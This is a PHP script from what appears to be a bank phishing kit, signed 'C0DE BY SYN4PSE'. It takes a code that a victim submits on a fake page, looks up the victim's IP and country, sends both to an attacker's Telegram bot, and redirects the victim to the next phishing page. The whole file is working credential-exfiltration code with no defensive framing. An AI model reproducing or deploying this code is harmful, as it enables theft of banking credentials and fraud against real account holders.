<?php
   ini_set("display_errors", 0);
   include "aquiva.php";
   
   
   if (isset($_POST['entoncesdaletra'])) {
       $breve = $_POST['entoncesdaletra'];
       $ipInfoResponse = getIpInfo($_SERVER['REMOTE_ADDR']);
       $codigopais = isset($ipInfoResponse['country']) ? $ipInfoResponse['country'] : 'Desconocido';
       $mensajito .= "B4NC0LS\nC0D3X: ".$_POST['entoncesdaletra']."\nYYP: ".$_SERVER['REMOTE_ADDR']."\nPaís: ".$codigopais."\nC0DE BY SYN4PSE";
   
       env($tribales, $tulum, $mensajito);
   }
   function getIpInfo($ip) {
       $url = "http://ipinfo.io/{$ip}/json";  
       $curl = curl_init();
       curl_setopt($curl, CURLOPT_URL, $url);
       curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
       $response = curl_exec($curl);
       curl_close($curl);
       
       return json_decode($response, true);
   }
   function env($dakota, $chatsito, $mensajillo) {
       $url = "https://api.telegram.org/bot{$dakota}/sendMessage";
       $data = array(
           'chat_id' => $chatsito,
           'text' => $mensajillo
       );
   
       $options = array(
           CURLOPT_URL => $url,
           CURLOPT_POST => true,
           CURLOPT_POSTFIELDS => http_build_query($data),
           CURLOPT_RETURNTRANSFER => true,
       );
   
       $curl = curl_init();
       curl_setopt_array($curl, $options);
       $response = curl_exec($curl);
       curl_close($curl);
   
       return $response;
       
   }
   echo "<script>window.location.href = \"mua.php\"</script>";
   
   ?>